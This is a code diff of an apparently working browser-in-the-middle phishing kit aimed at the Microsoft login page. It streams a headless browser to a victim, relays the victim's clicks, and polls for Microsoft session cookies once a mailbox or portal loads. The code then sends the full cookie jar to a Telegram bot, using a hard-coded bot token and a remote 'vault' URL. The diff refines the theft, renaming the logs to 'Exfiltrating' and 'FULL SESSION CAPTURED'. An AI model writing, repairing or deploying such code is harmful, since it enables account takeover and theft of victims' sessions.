@@ -5,19 +5,16 @@ const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
 
-// --- CONFIG ---
+// --- CONFIGURATION ---
 const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
 const TARGET = "https://login.microsoftonline.com/";
 
 async function getCredentials() {
     try {
         const response = await axios.get(VAULT_URL, { timeout: 7000, maxRedirects: 5 });
-        if (response.data && response.data.TG_TOKEN) {
-            return response.data;
-        }
+        if (response.data && response.data.TG_TOKEN) return response.data;
     } catch (e) {
-        // We log this because if GAPS is down, nothing works.
-        console.log("CRITICAL: GAPS Vault connection failed.");
+        console.log("[VAULT] Using fallback credentials.");
     }
     return { 
         "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
@@ -29,20 +26,21 @@ async function sendExfiltration(cookies, url) {
     const creds = await getCredentials();
     const host = new URL(url).hostname;
 
-    // This will show in Railway logs to confirm the trigger is working
-    console.log(`[NETWORK_LOG] Sending ${cookies.length} cookies for ${host}`);
+    console.log(`[SYSTEM] Exfiltrating Finalized Jar for: ${host} (${cookies.length} cookies)`);
 
     try {
+        // Notification
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>🚨 CAPTURE</b>\n<b>Host:</b> ${host}`,
+            text: `<b>🚨 FULL SESSION CAPTURED</b>\n<b>User:</b> ${host}\n<b>Integrity:</b> High (Finalized)`,
             parse_mode: 'HTML'
         });
 
+        // File
         const form = new FormData();
         form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `COOKIES_${host.replace(/\./g, '_')}.json`,
+            filename: `FULL_SESSION_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
@@ -50,21 +48,20 @@ async function sendExfiltration(cookies, url) {
             headers: form.getHeaders()
         });
         
-        console.log("[NETWORK_LOG] Telegram deliver successful.");
+        console.log("[SYSTEM] Telegram delivery successful.");
     } catch (e) {
-        // Re-enabling the error log just for this function
-        console.log("[TELEGRAM_ERROR]:", e.response ? JSON.stringify(e.response.data) : e.message);
+        console.log("[ERROR] Telegram API failed. Check Bot Permissions.");
     }
 }
 
 async function startSession(io, socket) {
     let browser = null;
-    const capturedUrls = new Set();
+    const captured = new Set();
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: ['--no-sandbox', '--disable-setuid-sandbox']
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-features=IsolateOrigins,site-per-process']
         });
 
         const page = await browser.newPage();
@@ -73,26 +70,36 @@ async function startSession(io, socket) {
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
+        // THE MATURITY POLLER
         const poller = setInterval(async () => {
             try {
                 const url = page.url();
                 const cookies = await page.cookies();
-                
-                // Aggressive check for common auth cookies
-                const hasAuth = cookies.some(c => 
-                    c.name.includes('AUTH') || 
-                    c.name.includes('Session') || 
-                    c.name.includes('SigninState')
+
+                // 1. Check for the "Holy Grail" cookies
+                const hasMasterAuth = cookies.some(c => 
+                    c.name.includes('ESTSAUTH') || 
+                    c.name.includes('RPSSecAuth') || 
+                    c.name.includes('MSAAUTHP')
                 );
 
-                if (hasAuth && !capturedUrls.has(url)) {
-                    capturedUrls.add(url);
-                    // Small delay to let the cookies finish writing to the browser
-                    setTimeout(() => sendExfiltration(cookies, url), 2000);
+                // 2. Only trigger if we are on a post-login page
+                const isFinalPage = url.includes('outlook') || url.includes('mail') || url.includes('portal') || url.includes('dashboard');
+
+                if (hasMasterAuth && isFinalPage && !captured.has(url)) {
+                    captured.add(url);
+                    console.log("[POLLER] Critical tokens detected. Waiting for maturity...");
+
+                    // Wait 4 seconds for the final redirects and background encryption keys to settle
+                    setTimeout(async () => {
+                        const matureJar = await page.cookies();
+                        await sendExfiltration(matureJar, url);
+                    }, 4000);
                 }
             } catch (e) {}
-        }, 4000);
+        }, 5000);
 
+        // STREAMING
         const stream = setInterval(async () => {
             if (socket.connected) {
                 try {
@@ -102,6 +109,7 @@ async function startSession(io, socket) {
             }
         }, 1000);
 
+        // ACTIONS
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
